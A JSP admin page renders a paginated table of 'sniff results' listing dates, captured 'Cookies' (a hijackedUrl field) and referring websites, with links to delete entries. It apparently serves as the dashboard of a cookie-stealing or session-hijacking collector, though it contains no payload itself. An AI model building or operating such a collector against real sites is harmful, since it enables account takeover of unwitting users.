<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page isELIgnored="false" %>
<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt" %>
<%@ taglib uri="http://displaytag.sf.net" prefix="display" %>
<html>
<head>
    <title></title>
</head>
<body>

<display:table name="sniffresults" id="row" pagesize="10"
               export="true" sort="list" requestURI="admin" class="table table-bordered table-striped">

    <display:setProperty name="paging.banner.no_items_found">
        <div class="pagination">No {0} found.</div>
    </display:setProperty>
    <display:setProperty name="paging.banner.one_item_found">
        <div class="pagination">One {0} found.</div>
    </display:setProperty>
    <display:setProperty name="paging.banner.all_items_found">
        <div class="pagination">{0} {1} found, displaying all {2}.</div>
    </display:setProperty>
    <display:setProperty name="paging.banner.some_items_found">
        <div class="pagination">{0} {1} found, displaying {2} to {3}.</div>
    </display:setProperty>
    <display:setProperty name="paging.banner.onepage">
        <div class="pagination">{0}</div>
    </display:setProperty>

    <display:column title="Date"
                    sortable="true" headerClass="sortable" sortProperty="sniffingDate">
        ${row.sniffingDate}
    </display:column>
    <display:column title="Cookies"
                    sortable="true" headerClass="sortable" class="col-md-7">
        ${row.hijackedUrl}
    </display:column>
    <display:column title="Referer"
                    sortable="true" headerClass="sortable" class="col-md-7"  sortProperty="referer">
        ${row.referer}
    </display:column>
    <display:column title="Delete history before"
                    class="col-md-7">
        <a href="delete?id=${row.id}">All before</a>
    </display:column>
    <display:column title="Delete history before"
                    class="col-md-7">
        <a href="delete?ref=${row.referer}">All for this website</a>
    </display:column>

</display:table>

</body>
</html>
